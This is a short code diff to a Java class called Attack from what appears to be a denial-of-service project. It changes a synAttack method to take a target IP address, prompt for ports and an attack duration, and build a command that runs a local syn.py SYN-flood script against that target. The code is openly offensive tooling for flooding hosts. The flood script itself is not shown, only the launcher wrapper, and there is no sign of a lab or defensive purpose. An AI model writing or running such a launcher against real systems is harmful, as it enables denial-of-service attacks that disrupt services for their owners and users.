@@ -30,15 +30,17 @@ public class Attack extends TargetData {
         }
     }
 
-    public static void synAttack() {
+    public static void synAttack(String ip) {
 
         Scanner input = new Scanner(System.in);
         System.out.print("Enter open ports to attack after \'-a\' ex. -a 22 :");
         String portsAppend = input.nextLine();
-        System.out.print("Enter a duration of attack: ");
-        String attackDuration = input.nextLine();
+        System.out.print("How long do you want to attack?");
+        String attackDuration = String.valueOf(TargetData.getIntValue());
 
-        String cmd = "python /home/kenzi/Dos/out/artifacts/Dos_jar/syn.py" + " -t " + defaultTargetIp + " -d " + attackDuration + "" + portsAppend;
+        String destinationIp = ip;
+
+        String cmd = "python /home/kenzi/Dos/out/artifacts/Dos_jar/syn.py" + " -t " + destinationIp + " -d " + attackDuration + "" + portsAppend;
         System.out.println(cmd); // for testing purpose
 
         try {
